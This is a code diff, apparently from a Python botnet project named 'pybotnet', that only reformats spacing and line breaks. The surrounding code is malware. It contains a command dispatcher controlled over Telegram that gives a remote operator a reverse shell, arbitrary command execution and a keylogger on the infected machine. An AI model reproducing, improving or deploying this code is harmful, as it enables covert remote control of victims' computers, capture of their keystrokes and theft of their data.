@@ -110,14 +110,15 @@ def reverse_shell(ADMIN_CHAT_ID, TELEGRAM_TOKEN, previous_update_id, logger):
                 send_message(out_put)
                 break
             else:
-                out_put = execute_cmd(message_one,ADMIN_CHAT_ID,TELEGRAM_TOKEN,logger)
+                out_put = execute_cmd(
+                    message_one, ADMIN_CHAT_ID, TELEGRAM_TOKEN, logger)
             send_message(out_put)
             repeat = 0
     logger.info("reverse shell exit.")
     return "reverse shell exit."
 
 
-def execute_scripts(command: str, pybotnet_up_time: int,ADMIN_CHAT_ID: str,
+def execute_scripts(command: str, pybotnet_up_time: int, ADMIN_CHAT_ID: str,
                     TELEGRAM_TOKEN: str, previous_update_id: List[int], logger):
     command_name = get_command_name(command)
     try:
@@ -139,7 +140,7 @@ def execute_scripts(command: str, pybotnet_up_time: int,ADMIN_CHAT_ID: str,
                 return get_info(pybotnet_up_time, logger)
 
             elif command_name == 'cmd':
-                return execute_cmd(command,ADMIN_CHAT_ID, TELEGRAM_TOKEN,logger,withThread=True)
+                return execute_cmd(command, ADMIN_CHAT_ID, TELEGRAM_TOKEN, logger, withThread=True)
 
             elif command_name == 'ls':
                 return execute_ls(command, logger)
@@ -160,7 +161,7 @@ def execute_scripts(command: str, pybotnet_up_time: int,ADMIN_CHAT_ID: str,
                 return command_help(logger)
 
             elif command_name in ['reverse_shell']:
-                return reverse_shell(ADMIN_CHAT_ID, TELEGRAM_TOKEN,previous_update_id, logger)
+                return reverse_shell(ADMIN_CHAT_ID, TELEGRAM_TOKEN, previous_update_id, logger)
 
             elif command_name == "keylogger" and split_command(command)[1] in ['start', 'stop']:
                 return keylogger(logger, command)
@@ -282,7 +283,7 @@ def clean_shell_data(output):
     return output
 
 
-def cmd(command,ADMIN_CHAT_ID,TELEGRAM_TOKEN,logger,withThread):
+def cmd(command, ADMIN_CHAT_ID, TELEGRAM_TOKEN, logger, withThread):
     '''Runs cmd commands.'''
 
     if command[0] == 'ls':
@@ -304,18 +305,21 @@ def cmd(command,ADMIN_CHAT_ID,TELEGRAM_TOKEN,logger,withThread):
     else:
         # Everything starts from here.
         if not withThread:
-            executecode = util.execute_commands(' '.join(command),ADMIN_CHAT_ID,TELEGRAM_TOKEN,logger)
+            executecode = util.execute_commands(
+                ' '.join(command), ADMIN_CHAT_ID, TELEGRAM_TOKEN, logger)
             result = executecode.runcommand_for_reverse_shell()
             return clean_shell_data(result)
 
         else:
-            executecode = util.execute_commands(' '.join(command),ADMIN_CHAT_ID,TELEGRAM_TOKEN,logger)
+            executecode = util.execute_commands(
+                ' '.join(command), ADMIN_CHAT_ID, TELEGRAM_TOKEN, logger)
             command = threading.Thread(target=executecode.runcommand)
             command.start()
             return "Your command is being executed , you will get the results when it is done."
 
-def execute_cmd(command: str,ADMIN_CHAT_ID: str, TELEGRAM_TOKEN : str, logger,withThread=False) -> str:
-    #Removed Is Shell
+
+def execute_cmd(command: str, ADMIN_CHAT_ID: str, TELEGRAM_TOKEN: str, logger, withThread=False) -> str:
+    # Removed Is Shell
     # For what is for reverse shell
     try:
         command = split_command(command)
@@ -327,8 +331,8 @@ def execute_cmd(command: str,ADMIN_CHAT_ID: str, TELEGRAM_TOKEN : str, logger,wi
 
     try:
         return cmd(
-            command,ADMIN_CHAT_ID,TELEGRAM_TOKEN,logger=logger,withThread=withThread
-            )
+            command, ADMIN_CHAT_ID, TELEGRAM_TOKEN, logger=logger, withThread=withThread
+        )
 
     except OverflowError as error:
         return f'cmd {error}'
